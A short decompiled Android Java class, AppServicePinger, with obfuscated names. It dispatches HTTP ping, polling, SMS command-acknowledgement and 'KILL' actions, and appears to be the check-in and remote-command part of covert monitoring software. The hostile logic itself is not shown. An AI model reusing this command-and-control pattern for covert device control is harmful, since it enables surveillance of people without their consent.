package com.network.android.android.monitor;

import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import com.network.android.a.c;
import com.network.android.c.a.a;
import com.network.android.j;

public class AppServicePinger extends IntentService {
    public AppServicePinger() {
        super("AppServicePinger");
    }

    /* access modifiers changed from: protected */
    public final void onHandleIntent(Intent intent) {
        try {
            String action = intent.getAction();
            a.a("AppServicePinger onHandleIntent: " + action);
            if ("httpPing".equals(action)) {
                c.a((Context) this, false);
            } else if ("KILL".equals(action)) {
                c.d(this);
            } else if ("httpPingTap".equals(action)) {
                c.a((Context) this, true);
            } else if ("httpPingPolling".equals(action)) {
                if (com.network.g.a.a(this)) {
                    a.a("AppServicePinger onHandleIntent PollingManager shouldPoll!");
                    if (j.a(this, false, true)) {
                        c.a((Context) this, true);
                        return;
                    }
                    return;
                }
                a.a("AppServicePinger onHandleIntent PollingManager  should NOT Poll! (pool in delay)");
            } else if ("httpPingSms".equals(action)) {
                String stringExtra = intent.getStringExtra("commandAck");
                int intExtra = intent.getIntExtra("counter", 1);
                a.a("AppServicePinger onHandleIntent commandAck: " + stringExtra);
                a.a("AppServicePinger onHandleIntent counter: " + intExtra);
                c.a(this, stringExtra, intExtra);
            }
        } catch (Throwable th) {
            a.a("AppServicePinger onHandleIntent  - " + th.getMessage(), th);
        }
    }
}
